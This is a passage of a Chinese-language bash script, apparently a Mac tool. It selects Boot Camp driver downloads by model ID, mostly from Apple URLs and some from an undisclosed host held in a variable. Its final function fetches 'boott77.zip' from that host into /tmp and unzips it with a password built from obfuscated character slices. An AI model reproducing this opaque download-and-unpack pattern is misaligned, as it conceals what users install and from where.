	else
	if [[ $modelbb = "MacBookPro11,4" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro11,5" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro10,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookPro10,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro9,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookPro9,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro8,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookPro8,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookPro8,3" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Downloadzxc
	else		
	
	
	
	
	
	if [[ $modelbb = "MacBook10,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.6813.zip"
	Downloadzxc
	else		
	if [[ $modelbb = "MacBook9,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6427.zip"
	Downloadzxc
	else		
	if [[ $modelbb = "MacBook8,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	
	
	
	
	if [[ $modelbb = "iMac20,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.8082.zip"
	Downloadzxc
	else		
	if [[ $modelbb = "iMac20,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.8082.zip"
	Downloadzxc
	else
	if [[ $modelbb = "iMac19,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7866.zip"
	Downloadzxc
	else
	if [[ $modelbb = "iMac19,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7866.zip"
	Downloadzxc
	else	
	if [[ $modelbb = "iMacPro1,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7866.zip"
	Downloadzxc
	else	
	if [[ $modelbb = "iMac18,3" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7866.zip"
	Downloadzxc
	else	
	if [[ $modelbb = "iMac18,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7866.zip"
	Downloadzxc
	else	
	if [[ $modelbb = "iMac18,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.6721.zip"
	Downloadzxc
	else
	if [[ $modelbb = "iMac17,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6237.zip"
	Downloadzxc
	else
	if [[ $modelbb = "iMac16,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6237.zip"
	Downloadzxc
	else
	if [[ $modelbb = "iMac16,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6237.zip"
	Downloadzxc
	else
	if [[ $modelbb = "iMac15,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "iMac14,4" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "iMac14,3" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "iMac14,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "iMac14,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "iMac13,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "iMac13,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "iMac12,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Downloadzxc
	else
	if [[ $modelbb = "iMac12,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Downloadzxc
	else	
	if [[ $modelbb = "MacPro7,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7667.zip"
	Downloadzxc
	else	
	if [[ $modelbb = "MacPro6,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacPro5,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacPro4,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Downloadzxc
	else
	
	
	

	if [[ $modelbb = "Macmini5,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Downloadzxc
	else
	if [[ $modelbb = "Macmini5,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Downloadzxc
	else
		if [[ $modelbb = "Macmini6,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "Macmini6,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "Macmini7,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "Macmini8,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7139.zip"
	Downloadzxc
	else
		
	if [[ $modelbb = *"Parallels14,1"* ]]; 
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Downloadzxc
	else
	
	
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Downloadzxc
	clear && printf "\e[3J"
	read -s -n1 -p "无法识别此机型支持Win10，无法开启下载"
	Customize
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi	
	fi
	fi
	fi
	fi
	fi
	fi	
	fi		
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi		
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi		
    fi
	fi
	fi
	fi
	fi	
	fi
	fi		
 	fi
	fi	
	fi
	fi 
	fi 
	fi 
	fi 
	fi 

exit 0
}


DowBootCamp(){
clear && printf "\e[3J"

	if [[ $modelbb = "MacBookAir9,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/16/33/041-84890/kj5efmjgugmbrx9lknsl7ab6ray0ctwf5o/BootCampESD.pkg"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookAir8,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/52/10/061-26579-A_7RJL96VW4I/z662ygc05hfe7cukb3itfbc8i1j7boxu95/BootCampESD.pkg"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookAir8,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/26/37/041-91736-A_6XKJ6AQL4K/9qene91xdcr1ytzik312zjmbaxyujy0p7j/BootCampESD.pkg"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookAir7,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookAir7,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookAir6,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookAir6,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookAir5,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookAir5,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookAir4,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookAir4,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	Downloadzxc
	else	
	
	
	
	
	
	
	if [[ $modelbb = "MacBookPro16,4" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/08/36/041-96204/w1q0ukl3x12fbeee41ex7lgjt82h7zrdn4/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro16,3" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/31/36/061-51481/6jxbd689uscmpm1bhsu9kv05kpthc2rdui/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro16,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/31/36/061-51481/6jxbd689uscmpm1bhsu9kv05kpthc2rdui/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro16,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/57/59/061-62383/5cwdopr0f0k6f3lqzb6j3ecnjx2ok9fdiw/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro15,4" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/41/45/061-26565-A_30YFW2NOY7/mcryv1yqxl8bmiok36kl4tiycf3g72uda5/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro15,3" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/24/61/041-88748/z2zwt4m9xtxt5sf64w9v5bz760cohxc2jc/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro15,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/24/46/041-91737-A_KOBGOTCIEZ/0b9gnebg3ivdfsd79simxpr60vvx9sy31k/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro15,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/24/46/041-91737-A_KOBGOTCIEZ/0b9gnebg3ivdfsd79simxpr60vvx9sy31k/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro14,3" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/47/29/041-89072-A_HZY5QI4LGV/knck1r3qmsw9nliisjjm7vll0zv1u239eu/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro14,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/32/09/041-89042-A_XVZ2U8XKG2/06ub1qfep6wv3g8bb68smwt3ac25xyng83/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro14,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/32/09/041-89042-A_XVZ2U8XKG2/06ub1qfep6wv3g8bb68smwt3ac25xyng83/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro13,3" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/25/38/041-88737-A_IXJZSM8OLV/fq3xy3duoq3xqp9o2sa8dkjtz5wvjaojhq/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro13,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/28/47/041-88734-A_Q0SKN07BL0/7knxzec1xmojr5x5t7xnu5a4u6lslmlf9v/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro13,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/28/47/041-88734-A_Q0SKN07BL0/7knxzec1xmojr5x5t7xnu5a4u6lslmlf9v/BootCampESD.pkg"
	Downloadzxc
	else		
	if [[ $modelbb = "MacBookPro12,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookPro12,4" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookPro12,5" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookPro11,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookPro11,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookPro11,3" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro11,4" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro11,5" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro10,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookPro10,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro9,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookPro9,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro8,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookPro8,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookPro8,3" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	Downloadzxc
	else		
	
	
	
	
	
	if [[ $modelbb = "MacBook10,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/32/09/041-89042-A_XVZ2U8XKG2/06ub1qfep6wv3g8bb68smwt3ac25xyng83/BootCampESD.pkg"
	Downloadzxc
	else		
	if [[ $modelbb = "MacBook9,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/35/26/041-88148-A_FV1FQ1MLRG/qyueop2fculv8o6ybt2oq266qo98pqphb9/BootCampESD.pkg"
	Downloadzxc
	else		
	if [[ $modelbb = "MacBook8,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/63/48/041-88436-A_A9JD5TGYOC/9qwbctjgtpqblqv40gl7uwf625j5pe796i/BootCampESD.pkg"
	Downloadzxc
	else
	
	
	
	
	if [[ $modelbb = "iMac20,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/10/11/001-04272/up3eig0wm5slvensvxyem836jceudix2vz/BootCampESD.pkg"
	Downloadzxc
	else		
	if [[ $modelbb = "iMac20,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/10/11/001-04272/up3eig0wm5slvensvxyem836jceudix2vz/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "iMac19,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/48/61/061-97204/zjcotww2iqibyvy6wbx3q9d50ca4lhig85/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "iMac19,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/48/61/061-97204/zjcotww2iqibyvy6wbx3q9d50ca4lhig85/BootCampESD.pkg"
	Downloadzxc
	else	
	if [[ $modelbb = "iMacPro1,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/48/61/061-97204/zjcotww2iqibyvy6wbx3q9d50ca4lhig85/BootCampESD.pkg"
	Downloadzxc
	else	
	if [[ $modelbb = "iMac18,3" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/48/61/061-97204/zjcotww2iqibyvy6wbx3q9d50ca4lhig85/BootCampESD.pkg"
	Downloadzxc
	else	
	if [[ $modelbb = "iMac18,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/48/61/061-97204/zjcotww2iqibyvy6wbx3q9d50ca4lhig85/BootCampESD.pkg"
	Downloadzxc
	else	
	if [[ $modelbb = "iMac18,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/53/06/041-88735-A_5MC8H30E1T/uzofvyg87dqhkn2qh1ipxy4f1uxduhitsb/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "iMac17,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/24/21/041-88430-A_MH044N1M88/l1tfz2ccakcy7ko79ugzcw0naadra581o3/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "iMac16,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/24/21/041-88430-A_MH044N1M88/l1tfz2ccakcy7ko79ugzcw0naadra581o3/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "iMac16,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/24/21/041-88430-A_MH044N1M88/l1tfz2ccakcy7ko79ugzcw0naadra581o3/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "iMac15,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "iMac14,4" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "iMac14,3" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "iMac14,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "iMac14,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "iMac13,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "iMac13,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "iMac12,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "iMac12,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	Downloadzxc
	else	
	
	
	
	if [[ $modelbb = "Macmini7,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "Macmini6,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "Macmini6,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "Macmini5,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "Macmini5,2" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "Macmini8,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/23/15/041-91731-A_LBI7Q8UWOG/juk1ng0hm623gxh3jv4qxt190ga1h5p0lw/BootCampESD.pkg"
	Downloadzxc
	else
	
	if [[ $modelbb = "MacPro7,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/20/53/001-55228-A_Z84FTTFMPF/6vx5i3e99yxd9fqpgreccheb7ng0m23pqk/BootCampESD.pkg"
	Downloadzxc
	else	
	if [[ $modelbb = "MacPro6,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacPro5,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	if [[ $modelbb = "MacPro4,1" ]];
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	Downloadzxc
	else
	
	
	
	if [[ $modelbb = *"Parallels14,1"* ]]; 
	then
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	Downloadzxc
	else
	
	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	Downloadzxc
	clear && printf "\e[3J"
	read -s -n1 -p "无法识别此机型支持Win10，无法开启下载"
	Customize
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi	
	fi
	fi
	fi
	fi
	fi
	fi	
	fi		
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi		
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi		
    fi
	fi
	fi
	fi
	fi	
	fi
	fi		
 	fi
	fi	
	fi
	fi 
	fi 
	fi 
	fi 
	fi 

Customize
}


ISO(){
clear && printf "\e[3J"	
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
if [ "$M1CPU" ]; then
iso="m1mkisofs"
index="5"
else
iso="mkisofs"
if [ ! "$index" ]; then
index="6"
fi
fi

/tmp/aria2c -c -s25 -x16 -m0 -o boot.zip --console-log-level=warn --summary-interval=888888888 $ip5/boott77.zip -d /tmp >/dev/null 2>&1


unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/boot.zip" -d "/tmp">/dev/null 2>&1

if [ ! -f "/tmp/winclone" ]; then
curl -# -C - --connect-timeout 10 -o "/tmp/boot.zip" "$ip5/boott77.zip">/dev/null 2>&1
